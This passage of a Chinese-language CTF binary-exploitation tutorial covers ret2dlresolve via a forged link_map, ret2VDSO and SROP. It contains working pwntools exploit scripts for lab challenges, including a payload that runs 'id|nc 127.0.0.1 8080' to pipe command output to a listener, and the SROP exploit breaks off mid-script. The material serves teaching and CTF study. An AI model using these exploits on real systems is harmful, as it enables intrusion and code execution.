<span class="token comment" spellcheck="true"># gdb.attach(io)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>需要注意这里的 <code>data_addr+43</code> 为伪造的 linkmap 的地址。执行效果如下</p>
<pre><code>❯ nc -l 127.0.0.1 8080
iromise</code></pre><p>上面的这种方式为伪造 link_map 的 l_addr 为目标函数和已解析函数之间的偏移。</p>
<p>根据之前的介绍，我们还可以伪造 l_addr 为已解析函数的地址， st_value 为已解析函数和目标函数之间的偏移。</p>
<pre><code>value = l-&gt;l_addr + sym-&gt;st_value</code></pre><p>这里，由于 <code>.got.plt</code> 的下方没多远就是 bss 段 data 的位置。当我们控制 linkmap 的地址位于 got 表附近时，同时我们还需要利用 link_map 的几个动态表指针，偏移从 0x68 开始。因此我们需要仔细构造对应的数据。这里我们选择伪造 link_map 到 0x600B80。</p>
<pre><code>0x600B80--&gt;link_map
0x600BC0--&gt;data    
0x600BC8--&gt;data+8
0x600BD0--&gt;data+16, args of puts
0x600BE8--&gt;data+24</code></pre><p>因此，我们可以控制的 puts 的参数的长度最大为 0x18。</p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
context<span class="token punctuation">.</span>terminal <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"tmux"</span><span class="token punctuation">,</span> <span class="token string">"splitw"</span><span class="token punctuation">,</span> <span class="token string">"-h"</span><span class="token punctuation">]</span>
io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"blinkroot"</span><span class="token punctuation">)</span>
elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"blinkroot"</span><span class="token punctuation">)</span>
libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./libc.so.6"</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">ret2dlresolve_with_fakelinkmap_x64</span><span class="token punctuation">(</span>libc<span class="token punctuation">,</span> fake_linkmap_addr<span class="token punctuation">,</span> offset_of_two_addr<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token triple-quoted-string string">'''
    libc: is the ELF object

    fake_linkmap_addr: the address of the fake linkmap

    offset_of_two_addr: target_function_addr - *(known_function_ptr), where
                        target_function_addr is the function you want to execute

    we will do _dl_runtime_resolve(linkmap,reloc_arg) where reloc_arg=1

    linkmap:
      P_DT_STRTAB, pointer for DT_STRTAB
        0x68: fake a pointer, e.g., fake_linkmap_addr
      p_DT_SYMTAB, pointer for fake_DT_SYMTAB
        0x70: fake_linkmap_addr + 0xc0
      fake_DT_JMPREL entry, addr = fake_linkmap_addr + 0x78
        0x78: 17, tag of the JMPREL
        0x80: fake_linkmap_add+0x88, pointer of the fake JMPREL
      fake_JMPREL, addr = fake_linkmap_addr + 0x88
        0x88: padding for the relocation entry of idx=0
        0x90: padding for the relocation entry of idx=0
        0x98: padding for the relocation entry of idx=0
        0xa0: p_r_offset, offset pointer to the resloved addr
        0xa8: r_info
        0xb0: append
      resolved addr
        0xb8: r_offset
      fake_DT_SYMTAB, addr = fake_linkmap_addr + 0xc0
        0xc0: 6, tag of the DT_SYMTAB
        0xc8: p_fake_symbol_table; here we can still use the fake r_info to set the index of symbol to 0
      fake_SYMTAB, addr = fake_linkmap_addr + 0xd0
        0xd0: 0x0000030000000000
        0xd8: offset_of_two_addr
        0xe0: fake st_size
      p_DT_JMPREL, pointer for fake_DT_JMPREL
        0xf8: fake_linkmap_addr + 0x78
    '''</span>
    linkmap <span class="token operator">=</span> p64<span class="token punctuation">(</span>fake_linkmap_addr<span class="token punctuation">)</span>
    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_linkmap_addr<span class="token operator">+</span><span class="token number">0xc0</span><span class="token punctuation">)</span>

    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">17</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_linkmap_addr <span class="token operator">+</span> <span class="token number">0x88</span><span class="token punctuation">)</span>
    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span>
    <span class="token comment" spellcheck="true"># here we set p_r_offset = libc.sym["__free_hook"]-libc.sym["__libc_start_main"]</span>
    <span class="token comment" spellcheck="true"># as void *const rel_addr = (void *)(l->l_addr + reloc->r_offset) and l->l_addr = __libc_start_main_addr</span>
    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__free_hook"</span><span class="token punctuation">]</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__libc_start_main"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">64</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x7</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>fake_linkmap_addr <span class="token operator">+</span> <span class="token number">0xd0</span><span class="token punctuation">)</span>

    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span><span class="token number">0x0000030000000000</span><span class="token punctuation">)</span> <span class="token operator">+</span> \
        p64<span class="token punctuation">(</span>offset_of_two_addr <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">64</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>

    linkmap <span class="token operator">=</span> linkmap<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0xf8</span><span class="token operator">-</span><span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>
    linkmap <span class="token operator">+=</span> p64<span class="token punctuation">(</span>fake_linkmap_addr <span class="token operator">+</span> <span class="token number">0x78</span><span class="token punctuation">)</span>

    <span class="token keyword">return</span> linkmap


<span class="token comment" spellcheck="true"># .got.plt:0000000000600B40 _GLOBAL_OFFSET_TABLE_ dq offset _DYNAMIC</span>
<span class="token comment" spellcheck="true"># .got.plt:0000000000600B48 qword_600B48    dq 0</span>
target_addr <span class="token operator">=</span> <span class="token number">0x600B40</span>
data_addr <span class="token operator">=</span> <span class="token number">0x600BC0</span>
offset <span class="token operator">=</span> target_addr<span class="token operator">-</span>data_addr
payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>offset <span class="token operator">&amp;</span> <span class="token punctuation">(</span><span class="token number">2</span><span class="token operator">**</span><span class="token number">64</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> p64<span class="token punctuation">(</span>elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"__libc_start_main"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> <span class="token string">"id|nc 127.0.0.1 8080\x00"</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x18</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>
payload <span class="token operator">+=</span> ret2dlresolve_with_fakelinkmap_x64<span class="token punctuation">(</span>libc<span class="token punctuation">,</span> elf<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">"__libc_start_main"</span><span class="token punctuation">]</span><span class="token punctuation">,</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"system"</span><span class="token punctuation">]</span><span class="token operator">-</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">"__libc_start_main"</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
payload <span class="token operator">=</span> payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">,</span> <span class="token string">'A'</span><span class="token punctuation">)</span>
<span class="token comment" spellcheck="true"># gdb.attach(io)</span>
io<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>需要注意的是，在伪造 linkmap  的时候，我们是从偏移 0x68 开始构造的，所以在最后对齐的时候设置 <code>linkmap.ljust(0xf8-0x68, 'A')</code>。</p>
<p>执行效果</p>
<pre class="line-numbers language-shell"><code class="language-shell">❯ nc -l 127.0.0.1 8080
uid=1000(iromise) gid=1000(iromise)...<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><table>
<thead>
<tr>
<th></th>
<th>修改 dynamic 节的内容</th>
<th>修改重定位表项的位置</th>
<th>伪造 linkmap</th>
</tr>
</thead>
<tbody><tr>
<td>主要前提要求</td>
<td>无</td>
<td>无</td>
<td>无信息泄漏时需要 libc</td>
</tr>
<tr>
<td>适用情况</td>
<td>NO RELRO</td>
<td>NO RELRO, Partial RELRO</td>
<td>NO RELRO, Partial RELRO</td>
</tr>
<tr>
<td>注意点</td>
<td></td>
<td>确保版本检查通过；确保重定位位置可写；确保重定位表项、符号表、字符串表一一对应</td>
<td>确保重定位位置可写；需要着重伪造重定位表项、符号表；</td>
</tr>
</tbody></table>
<p>总的来说，与 ret2dlresolve 攻击最为相关的一些动态节为</p>
<ul>
<li>DT_JMPREL</li>
<li>DT_SYMTAB</li>
<li>DT_STRTAB</li>
<li>DT_VERSYM</li>
</ul>
<h1 id="ret2VDSO"><a href="#ret2VDSO" class="headerlink" title="ret2VDSO"></a>ret2VDSO</h1><h2 id="VDSO介绍"><a href="#VDSO介绍" class="headerlink" title="VDSO介绍"></a>VDSO介绍</h2><p>什么是VDSO(Virtual Dynamically-linked Shared Object)呢？听其名字，大概是虚拟动态链接共享对象，所以说它应该是虚拟的，与虚拟内存一致，在计算机中本身并不存在。具体来说，它是将内核态的调用映射到用户地址空间的库。那么它为什么会存在呢？这是因为有些系统调用经常被用户使用，这就会出现大量的用户态与内核态切换的开销。通过vdso，我们可以大量减少这样的开销，同时也可以使得我们的路径更好。这里路径更好指的是，我们不需要使用传统的int 0x80来进行系统调用，不同的处理器实现了不同的快速系统调用指令</p>
<ul>
<li>intel实现了sysenter，sysexit</li>
<li>amd实现了syscall，sysret</li>
</ul>
<p>当不同的处理器架构实现了不同的指令时，自然就会出现兼容性问题，所以linux实现了vsyscall接口，在底层会根据具体的结构来进行具体操作。而vsyscall就实现在vdso中。</p>
<p>这里，我们顺便来看一下vdso，在Linux(kernel 2.6 or upper)中执行ldd /bin/sh, 会发现有个名字叫linux-vdso.so.1(老点的版本是linux-gate.so.1)的动态文件, 而系统中却找不到它, 它就是VDSO。 例如:</p>
<pre class="line-numbers language-shell"><code class="language-shell">➜  ~ ldd /bin/sh
    linux-vdso.so.1 =>  (0x00007ffd8ebf2000)
    libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f84ff2f9000)
    /lib64/ld-linux-x86-64.so.2 (0x0000560cae6eb000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>除了快速系统调用，glibc也提供了VDSO的支持, open(), read(), write(), gettimeofday()都可以直接使用VDSO中的实现。使得这些调用速度更快。 内核新特性在不影响glibc的情况下也可以更快的部署。</p>
<p>这里我们以intel的处理器为例，进行简单说明。</p>
<p>其中sysenter的参数传递方式与int 0x80一致，但是我们可能需要自己布置好 function prolog（32位为例）</p>
<pre class="line-numbers language-asm"><code class="language-asm">push ebp
mov ebp,esp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>此外，如果我们没有提供functtion prolog的话，我们还需要一个可以进行栈迁移的gadgets，以便于可以改变栈的位置。</p>
<h1 id="SROP"><a href="#SROP" class="headerlink" title="SROP"></a>SROP</h1><h2 id="基本介绍-1"><a href="#基本介绍-1" class="headerlink" title="基本介绍"></a>基本介绍</h2><p>SROP(Sigreturn Oriented Programming)于2014年被Vrije Universiteit Amsterdam的Erik Bosman提出，其相关研究<strong><code>Framing Signals — A Return to Portable Shellcode</code></strong>发表在安全顶级会议<a href="http://www.ieee-security.org/TC/SP2014" target="_blank" rel="noopener">Oakland 2014</a>上，被评选为当年的<a href="http://www.ieee-security.org/TC/SP2014/awards.html" target="_blank" rel="noopener">Best Student Papers</a>。其中相关的paper以及slides的链接如下：</p>
<p><a href="http://www.ieee-security.org/TC/SP2014/papers/FramingSignals-AReturntoPortableShellcode.pdf" target="_blank" rel="noopener">paper</a></p>
<p><a href="https://tc.gtisc.gatech.edu/bss/2014/r/srop-slides.pdf" target="_blank" rel="noopener">slides</a></p>
<p>其中，<code>sigreturn</code>是一个系统调用，在类unix系统发生signal的时候会被间接地调用。</p>
<h2 id="signal机制"><a href="#signal机制" class="headerlink" title="signal机制"></a>signal机制</h2><p> signal机制是类unix系统中进程之间相互传递信息的一种方法。一般，我们也称其为软中断信号，或者软中断。比如说，进程之间可以通过系统调用kill来发送软中断信号。一般来说，信号机制常见的步骤如下图所示：</p>
<p><img src="/images/loading.gif" data-original="../images/CTF/ProcessOfSignalHandlering.png" alt=""></p>
<ol>
<li><p>内核向某个进程发送signal机制，该进程会被暂时挂起，进入内核态。</p>
</li>
<li><p>内核会为该进程保存相应的上下文，<strong>主要是将所有寄存器压入栈中，以及压入signal信息，以及指向sigreturn的系统调用地址</strong>。此时栈的结构如下图所示，我们称ucontext以及siginfo这一段为Signal Frame。<strong>需要注意的是，这一部分是在用户进程的地址空间的。</strong>之后会跳转到注册过的signal handler中处理相应的signal。因此，当signal handler执行完之后，就会执行sigreturn代码。</p>
<p> <img src="/images/loading.gif" data-original="../images/CTF/signal2-stack.png" alt=""></p>
<p> 对于signal Frame来说，会因为架构的不同而有所区别，这里给出分别给出x86以及x64的sigcontext</p>
<ul>
<li><p>x86</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">struct</span> sigcontext
<span class="token punctuation">{</span>
<span class="token keyword">unsigned</span> <span class="token keyword">short</span> gs<span class="token punctuation">,</span> __gsh<span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">short</span> fs<span class="token punctuation">,</span> __fsh<span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">short</span> es<span class="token punctuation">,</span> __esh<span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">short</span> ds<span class="token punctuation">,</span> __dsh<span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">long</span> edi<span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">long</span> esi<span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">long</span> ebp<span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">long</span> esp<span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">long</span> ebx<span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">long</span> edx<span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">long</span> ecx<span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">long</span> eax<span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">long</span> trapno<span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">long</span> err<span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">long</span> eip<span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">short</span> cs<span class="token punctuation">,</span> __csh<span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">long</span> eflags<span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">long</span> esp_at_signal<span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">short</span> ss<span class="token punctuation">,</span> __ssh<span class="token punctuation">;</span>
<span class="token keyword">struct</span> _fpstate <span class="token operator">*</span> fpstate<span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">long</span> oldmask<span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">long</span> cr2<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
<li><p>x64</p>
<pre class="line-numbers language-c"><code class="language-c"><span class="token keyword">struct</span> _fpstate
<span class="token punctuation">{</span>
<span class="token comment" spellcheck="true">/* FPU environment matching the 64-bit FXSAVE layout.  */</span>
__uint16_t        cwd<span class="token punctuation">;</span>
__uint16_t        swd<span class="token punctuation">;</span>
__uint16_t        ftw<span class="token punctuation">;</span>
__uint16_t        fop<span class="token punctuation">;</span>
__uint64_t        rip<span class="token punctuation">;</span>
__uint64_t        rdp<span class="token punctuation">;</span>
__uint32_t        mxcsr<span class="token punctuation">;</span>
__uint32_t        mxcr_mask<span class="token punctuation">;</span>
<span class="token keyword">struct</span> _fpxreg    _st<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token keyword">struct</span> _xmmreg    _xmm<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
__uint32_t        padding<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>

<span class="token keyword">struct</span> sigcontext
<span class="token punctuation">{</span>
__uint64_t r8<span class="token punctuation">;</span>
__uint64_t r9<span class="token punctuation">;</span>
__uint64_t r10<span class="token punctuation">;</span>
__uint64_t r11<span class="token punctuation">;</span>
__uint64_t r12<span class="token punctuation">;</span>
__uint64_t r13<span class="token punctuation">;</span>
__uint64_t r14<span class="token punctuation">;</span>
__uint64_t r15<span class="token punctuation">;</span>
__uint64_t rdi<span class="token punctuation">;</span>
__uint64_t rsi<span class="token punctuation">;</span>
__uint64_t rbp<span class="token punctuation">;</span>
__uint64_t rbx<span class="token punctuation">;</span>
__uint64_t rdx<span class="token punctuation">;</span>
__uint64_t rax<span class="token punctuation">;</span>
__uint64_t rcx<span class="token punctuation">;</span>
__uint64_t rsp<span class="token punctuation">;</span>
__uint64_t rip<span class="token punctuation">;</span>
__uint64_t eflags<span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">short</span> cs<span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">short</span> gs<span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">short</span> fs<span class="token punctuation">;</span>
<span class="token keyword">unsigned</span> <span class="token keyword">short</span> __pad0<span class="token punctuation">;</span>
__uint64_t err<span class="token punctuation">;</span>
__uint64_t trapno<span class="token punctuation">;</span>
__uint64_t oldmask<span class="token punctuation">;</span>
__uint64_t cr2<span class="token punctuation">;</span>
__extension__ <span class="token keyword">union</span>
<span class="token punctuation">{</span>
  <span class="token keyword">struct</span> _fpstate <span class="token operator">*</span> fpstate<span class="token punctuation">;</span>
  __uint64_t __fpstate_word<span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span>
__uint64_t __reserved1 <span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
</li>
</ul>
</li>
<li><p>signal handler返回后，内核为执行sigreturn系统调用，为该进程恢复之前保存的上下文，其中包括将所有压入的寄存器，重新pop回对应的寄存器，最后恢复进程的执行。其中，32位的sigreturn的调用号为77，64位的系统调用号为15。</p>
</li>
</ol>
<h2 id="攻击原理-1"><a href="#攻击原理-1" class="headerlink" title="攻击原理"></a>攻击原理</h2><p>仔细回顾一下内核在signal信号处理的过程中的工作，我们可以发现，内核主要做的工作就是为进程保存上下文，并且恢复上下文。这个主要的变动都在Signal Frame中。但是需要注意的是：</p>
<ul>
<li>Signal Frame被保存在用户的地址空间中，所以用户是可以读写的。</li>
<li>由于内核与信号处理程序无关(kernel agnostic about signal handlers)，它并不会去记录这个signal对应的Signal Frame，所以当执行sigreturn系统调用时，此时的Signal Frame并不一定是之前内核为用户进程保存的Signal Frame。</li>
</ul>
<p>说到这里，其实，SROP的基本利用原理也就出现了。下面举两个简单的例子。</p>
<h3 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h3><p>首先，我们假设攻击者可以控制用户进程的栈，那么它就可以伪造一个Signal Frame，如下图所示，这里以64位为例子，给出Signal Frame更加详细的信息</p>
<p><img src="/images/loading.gif" data-original="./figure/srop-example-1.png" alt="signal2-stack"></p>
<p>当系统执行完sigreturn系统调用之后，会执行一系列的pop指令以便于恢复相应寄存器的值，当执行到rip时，就会将程序执行流指向syscall地址，根据相应寄存器的值，此时，便会得到一个shell。</p>
<h3 id="system-call-chains"><a href="#system-call-chains" class="headerlink" title="system call chains"></a>system call chains</h3><p>需要指出的是，上面的例子中，我们只是单独的获得一个shell。有时候，我们可能会希望执行一系列的函数。我们只需要做两处修改即可</p>
<ul>
<li><strong>控制栈指针。</strong></li>
<li><strong>把原来rip指向的<code>syscall</code> gadget换成<code>syscall; ret</code> gadget。</strong></li>
</ul>
<p>如下图所示 ，这样当每次syscall返回的时候，栈指针都会指向下一个Signal Frame。因此就可以执行一系列的sigreturn函数调用。</p>
<p><img src="/images/loading.gif" data-original="./figure/srop-example-2.png" alt="signal2-stack"></p>
<h3 id="后续"><a href="#后续" class="headerlink" title="后续"></a>后续</h3><p>需要注意的是，我们在构造ROP攻击的时候，需要满足下面的条件</p>
<ul>
<li><strong>可以通过栈溢出来控制栈的内容</strong></li>
<li><strong>需要知道相应的地址</strong><ul>
<li><strong>“/bin/sh”</strong></li>
<li><strong>Signal Frame</strong></li>
<li><strong>syscall</strong></li>
<li><strong>sigreturn</strong></li>
</ul>
</li>
<li>需要有够大的空间来塞下整个sigal frame</li>
</ul>
<p>此外，关于sigreturn以及syscall;ret这两个gadget在上面并没有提及。提出该攻击的论文作者发现了这些gadgets出现的某些地址：</p>
<p><img src="/images/loading.gif" data-original="./figure/srop-gadget-1.png" alt="gadget1"></p>
<p>并且，作者发现，有些系统上SROP的地址被随机化了，而有些则没有。比如说<code>Linux &lt; 3.3 x86_64</code>（在Debian 7.0， Ubuntu Long Term Support， CentOS 6系统中默认内核），可以直接在vsyscall中的固定地址处找到syscall&amp;return代码片段。如下</p>
<p><img src="/images/loading.gif" data-original="./figure/srop-gadget-2.png" alt="gadget1"></p>
<p>但是目前它已经被<code>vsyscall-emulate</code>和<code>vdso</code>机制代替了。此外，目前大多数系统都会开启ASLR保护，所以相对来说这些gadgets都并不容易找到。</p>
<p>值得一说的是，对于sigreturn系统调用来说，在64位系统中，sigreturn系统调用对应的系统调用号为15，只需要RAX=15，并且执行syscall即可实现调用syscall调用。而RAX寄存器的值又可以通过控制某个函数的返回值来间接控制，比如说read函数的返回值为读取的字节数。</p>
<h2 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h2><p><strong>值得一提的是，在目前的pwntools中已经集成了对于srop的攻击。</strong></p>
<h2 id="示例-1"><a href="#示例-1" class="headerlink" title="示例"></a>示例</h2><p>这里以360春秋杯中的smallest-pwn为例进行简单介绍。基本步骤如下</p>
<p><strong>确定文件基本信息</strong></p>
<pre class="line-numbers language-text"><code class="language-text">➜  smallest file smallest
smallest: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), statically linked, stripped<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
<p>可以看到该程序为64位静态链接版本。</p>
<p><strong>检查保护</strong></p>
<pre class="line-numbers language-text"><code class="language-text">➜  smallest checksec smallest
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>程序主要开启了NX保护。</p>
<p><strong>漏洞发现</strong></p>
<p>实用IDA直接反编译看了一下，发现程序就几行汇编代码，如下</p>
<pre class="line-numbers language-asm"><code class="language-asm">public start
start proc near
xor     rax, rax
mov     edx, 400h
mov     rsi, rsp
mov     rdi, rax
syscall
retn
start endp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>根据syscall的编号为0，可以知道该程序执行的指令为read(0,$rsp,400)，即向栈顶读入400个字符。毫无疑问，这个是有栈溢出的。</p>
<p><strong>利用思路</strong></p>
<p>由于程序中并没有sigreturn调用，所以我们得自己构造，正好这里有read函数调用，所以我们可以通过read函数读取的字节数来设置rax的值。重要思路如下</p>
<ul>
<li>通过控制read读取的字符数来设置RAX寄存器的值，从而执行sigreturn</li>
<li>通过syscall执行execve(“/bin/sh”,0,0)来获取shell。</li>
</ul>
<p><strong>漏洞利用程序</strong></p>
<pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
<span class="token keyword">from</span> LibcSearcher <span class="token keyword">import</span> <span class="token operator">*</span>
small <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./smallest'</span><span class="token punctuation">)</span>
<span class="token keyword">if</span> args<span class="token punctuation">[</span><span class="token string">'REMOTE'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">'127.0.0.1'</span><span class="token punctuation">,</span> <span class="token number">7777</span><span class="token punctuation">)</span>
<span class="token keyword">else</span><span class="token punctuation">:</span>
    sh <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">'./smallest'</span><span class="token punctuation">)</span>
context<span class="token punctuation">.</span>arch <span class="token operator">=</span> <span class="token string">'amd64'</span>
context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span>
syscall_ret <span class="token operator">=</span> <span class="token number">0x00000000004000BE</span>
start_addr <span class="token operator">=</span> <span class="token number">0x00000000004000B0</span>
<span class="token comment" spellcheck="true">## set start addr three times</span>
payload <span class="token operator">=</span> p64<span class="token punctuation">(</span>start_addr<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">3</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

<span class="token comment" spellcheck="true">## modify the return addr to start_addr+3</span>
<span class="token comment" spellcheck="true">## so that skip the xor rax,rax; then the rax=1</span>
<span class="token comment" spellcheck="true">## get stack addr</span>
sh<span class="token punctuation">.</span>send<span class="token punctuation">(</span><span class="token string">'\xb3'</span><span class="token punctuation">)</span>
